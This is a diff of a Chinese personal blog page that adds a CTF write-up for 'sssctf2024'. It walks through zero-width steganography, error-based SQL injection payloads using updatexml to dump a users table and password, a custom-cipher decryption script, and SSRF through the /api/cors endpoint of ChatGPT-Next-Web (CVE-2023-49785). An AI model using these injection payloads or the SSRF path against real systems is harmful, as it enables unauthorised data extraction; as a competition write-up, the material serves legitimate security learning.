@@ -24,7 +24,7 @@
 
   
 
-  <title>introduce | Ins0mn1a</title>
+  <title>sssctf2024-复现 | Ins0mn1a</title>
 
   
 
@@ -101,20 +101,27 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">introduce</h1>
+          <h1 class="title-wrap">sssctf2024-复现</h1>
           <h2 class="title-sub-wrap">
             <strong>Ins0mn1a93</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-12-06T02:30:26.000Z" itemprop="datePublished">2024-12-06</time>
+            <time  class="article-date" datetime="2024-05-07T03:27:59.000Z" itemprop="datePublished">2024-05-07</time>
           </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2024-12-06T12:40:44.792Z" itemprop="dateUpdated">2024-12-06</time>
+            </h2>
           
           
           <ul class="wrap-list dark">
   
+    <li><a href="/categories/%E6%A0%A1%E9%99%A2%E8%B5%9B/">📒 校院赛</a></li>
+    
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/Myself/">🏷️ Myself</a></li>
+    <li><a href="/tags/CTF/">🏷️ CTF</a></li>
   
 </ul>
         </div>
@@ -138,7 +145,56 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
+        <p>哎校赛，哎没想那么多，哎想偏了，哎不会了…</p>
+<h1><span id="计费系统">计费系统</span></h1>
+<p><img src="image-20240507113355447.png" alt="image-20240507113355447"></p>
+<p>这一页是没有注入的，只能sso登录</p>
+<span id="more"></span>
+<p>登陆之后直接进入<code>/Self/service/myMac</code>路由下寻找信息（前面的信息寻找过程略），发现存在隐写字符</p>
+<p><img src="image-20240507113825768.png" alt="image-20240507113825768"></p>
+<p><img src="image-20240507113835015.png" alt="image-20240507113835015"></p>
+<p>这里要注意一下，零宽隐写字符的加密解密需要在同一个网页进行，说白了，用啥工具加密就用啥工具解密，当时做的时候忙着找各种网站尝试解密了，后面才试出来（所以下面的第一个工具会解出来乱码）</p>
+<p><img src="image-20240507114310864.png" alt="image-20240507114310864"></p>
+<p><img src="image-20240507114415958.png" alt="image-20240507114415958"></p>
+<p>去到<code>/Administrator/Login</code>中查看信息</p>
+<p>这里可能存在sql注入，可以尝试闭合</p>
+<p><img src="image-20240507114627853.png" alt="image-20240507114627853"></p>
+<p>这里试出来是<code>&quot;</code>闭合，根据返回的信息推测是布尔盲注</p>
+<p>直接上payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);#  # ChallengeDatabase</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;ChallengeDatabase&#x27; limit 0,1),0x7e),1);# # users</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),0x7e),1);# # id,loginip,name,password,sso</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),0,40),0x7e),1);# 这里由于最大长度的限制，所以用到了substring来截取密码，把起始点和截取长度改一下就行 得到05d1b851-ef06-4460-9c30-4249086631d3</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240507120047258.png" alt="image-20240507120047258"></p>
+<p><img src="image-20240507120400327.png" alt="image-20240507120400327"></p>
+<p><img src="image-20240507120450857.png" alt="image-20240507120450857"></p>
+<p>得到账户名和密码后发现以下界面</p>
+<p><img src="image-20240507121550360.png" alt="image-20240507121550360"></p>
+<p>抓个包看看</p>
+<p>注意到一个dashboard跳转，发现一个之前界面中没有的aes.js</p>
+<p><img src="image-20240507121754961.png" alt="image-20240507121754961"></p>
+<p>查看发现有以下脚本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// const aes256cbcDecrypt = (encryptedData, key, iv) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     const decipher = crypto.createDecipheriv(&#x27;aes-256-cbc&#x27;, key, iv);</span></span><br><span class="line"><span class="comment">//     return decryptedData;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">// const key = &quot;a1e7091c4f39e1571f5d4eaf08c7b28c&quot;;</span></span><br><span class="line"><span class="comment">// const iv = &quot;e8d4f92b75f64e7c&quot;;</span></span><br><span class="line"><span class="comment">// function readtokens(token) &#123;</span></span><br><span class="line"><span class="comment">//     return aes256cbcDecrypt(token, key, iv);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
+<p>这里用到了aes256cbc方式加密，可能在之前的界面中有输出，回去看一下</p>
+<p><img src="image-20240507122039872.png" alt="image-20240507122039872"></p>
+<p>发现一串可疑字符串，猜测就是该加密方式下的密文，拿去解密一下</p>
+<p><img src="image-20240507122803080.png" alt="image-20240507122803080"></p>
+<p>根据题目描述，所有账户的密码相同，flag为flag账户的密码，因此我们的账户密码也是flag，上面一串字符串就是</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decipher_sssctf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    PRIMENUM1_SSSCTF = <span class="number">100537</span></span><br><span class="line">    KEYWORD_SSSCTF = <span class="number">45452</span></span><br><span class="line">    MIN_ASC = <span class="number">32</span></span><br><span class="line">    MAX_ASC = <span class="number">126</span></span><br><span class="line">    NUM_ASC = MAX_ASC - MIN_ASC + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>) - <span class="number">1</span>):</span><br><span class="line">        ch = <span class="built_in">ord</span>(<span class="built_in">str</span>[i])</span><br><span class="line">        <span class="keyword">if</span> MIN_ASC &lt;= ch &lt;= MAX_ASC:</span><br><span class="line">            ch -= MIN_ASC</span><br><span class="line">            offset = <span class="built_in">round</span>((NUM_ASC + <span class="number">1</span>) * ((KEYWORD_SSSCTF * (i + <span class="number">1</span>)) % PRIMENUM1_SSSCTF) / PRIMENUM1_SSSCTF - <span class="number">0.5</span>)</span><br><span class="line">            ch = (ch - offset) % NUM_ASC</span><br><span class="line">            <span class="keyword">if</span> ch &lt; <span class="number">0</span>:</span><br><span class="line">                ch += NUM_ASC</span><br><span class="line">            ch += MIN_ASC</span><br><span class="line">            result += <span class="built_in">chr</span>(ch)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">decrypted_string = decipher_sssctf(<span class="string">&quot;~Ju1m++tij_^%R!Cz@;e\/(TOutE&gt;9.`.XSLKt@nf8asa&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted String:&quot;</span>, decrypted_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="image-20240507123225385.png" alt="image-20240507123225385"></p>
+<p>根据之前出题人的提示，说可以爆出来。当时也尝试过，可惜的是解密算法没有写对，所以没有爆出来。。。</p>
+<p>（当时考虑了keyword有可能是字符串的原因，所以后面就没怎么想了）</p>
+<h1><span id="scr1wgpt">scr1wgpt</span></h1>
+<p>这里根据提示，发现过滤了or和and，考虑用||和&amp;&amp;绕过；由于登录界面只有login failed，所以考虑时间注入</p>
+<p>脚本如下：（环境有点问题，略)</p>
+<p>得到用户名密码分别为：<code>Scr1w_admin</code>，<code>sssctf2024_P@ssvv0rd</code></p>
+<p>GPT那有一个CVE漏洞，为<code>CVE-2023-49785</code></p>
+<h2><span id="cve-2023-49785">CVE-2023-49785</span></h2>
+<p>ChatGPT-Next-Web 的 API Endpoint <code>/api/cors</code> 上存在 SSRF 漏洞，可被用于从服务器端发起任意网络请求并取得响应内容。</p>
+<p><code>/api/cors</code>用于开放代理，允许未经身份验证的用户通过它发送任意HTTP请求，不过这会存在一个问题：<strong>它允许客户端通过服务器端端点访问跨域资源，从而绕过内置的浏览器保护以访问跨域资源。</strong></p>
+<p>例如下图：</p>
+<p><img src="image-20240508144550526.png" alt="image-20240508144550526"></p>
+<p>由于题目告诉我们flag是被藏在scr1wgpt-web里，所以直接访问<code>/api/cors/http/scr1wgpt-web/generator</code></p>
+<p><img src="image-20240508144705490.png" alt="image-20240508144705490"></p>
+
       </section>
 
       
@@ -150,8 +206,8 @@
     
     <div class="card-text">
       
-        <a href="/2024/12/06/blog-problem/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">关于在做博客时遇到的问题</h2>
+        <a href="/2024/09/02/XGCTF/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">XGCTF</h2>
         </a>
       
       <div class="card-text--row">Newer</div>
@@ -165,8 +221,8 @@
     
     <div class="card-text">
       
-        <a href="/2024/12/05/ssti%E5%88%9D%E8%AF%86/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ssti初识</h2>
+        <a href="/2024/04/22/dasctf-gfctf/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">dasctf_gfctf四月赛复现</h2>
         </a>
       
       <div class="card-text--row">Older</div>
@@ -416,25 +472,37 @@
         <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
 </svg>
-        <span>11</span>
+        <span>14</span>
       </div>
       <div class="count-box--item">
         <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
 </svg>
-        1
+        4
       </div>
       <div class="count-box--item">
         <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
 </svg>
-        9
+        8
       </div>
     </div>
   </div>
 </section>
 
       
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">计费系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">scr1wgpt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2023-49785</span></a></li></ol></li></ol>
+  </div>
+</section>
+
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -461,8 +529,26 @@
     <ul class="categories-list">
       
         <li class="categories-list-item">
+          <a href="/categories/ctfshow%E5%B9%B3%E5%8F%B0/">
+            ctfshow平台 (3)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E6%A0%A1%E9%99%A2%E8%B5%9B/">
+            校院赛 (2)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
           <a href="/categories/buu%E5%B9%B3%E5%8F%B0/">
-            buu平台 (2)
+            buu平台 (3)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/Web%E5%9F%BA%E7%A1%80/">
+            Web基础 (2)
           </a>
         </li>
         
@@ -479,7 +565,7 @@
   </div>
   <div class="widget-body">
     <div class="tags-cloud">
-      <a href="/tags/About-blog/" style="font-size: 10px;" class="tags-cloud-0">About blog</a> <a href="/tags/BUU/" style="font-size: 15px;" class="tags-cloud-5">BUU</a> <a href="/tags/CTF/" style="font-size: 20px;" class="tags-cloud-10">CTF</a> <a href="/tags/Misc/" style="font-size: 10px;" class="tags-cloud-0">Misc</a> <a href="/tags/Myself/" style="font-size: 10px;" class="tags-cloud-0">Myself</a> <a href="/tags/SSTI/" style="font-size: 15px;" class="tags-cloud-5">SSTI</a> <a href="/tags/Upload/" style="font-size: 10px;" class="tags-cloud-0">Upload</a> <a href="/tags/Web/" style="font-size: 15px;" class="tags-cloud-5">Web</a> <a href="/tags/ctfshow/" style="font-size: 15px;" class="tags-cloud-5">ctfshow</a>
+      <a href="/tags/About-blog/" style="font-size: 10px;" class="tags-cloud-0">About blog</a> <a href="/tags/BUU/" style="font-size: 16.67px;" class="tags-cloud-7">BUU</a> <a href="/tags/CTF/" style="font-size: 20px;" class="tags-cloud-10">CTF</a> <a href="/tags/Misc/" style="font-size: 10px;" class="tags-cloud-0">Misc</a> <a href="/tags/SSTI/" style="font-size: 13.33px;" class="tags-cloud-3">SSTI</a> <a href="/tags/Upload/" style="font-size: 10px;" class="tags-cloud-0">Upload</a> <a href="/tags/Web/" style="font-size: 13.33px;" class="tags-cloud-3">Web</a> <a href="/tags/ctfshow/" style="font-size: 13.33px;" class="tags-cloud-3">ctfshow</a>
     </div>
   </div>
 </section>
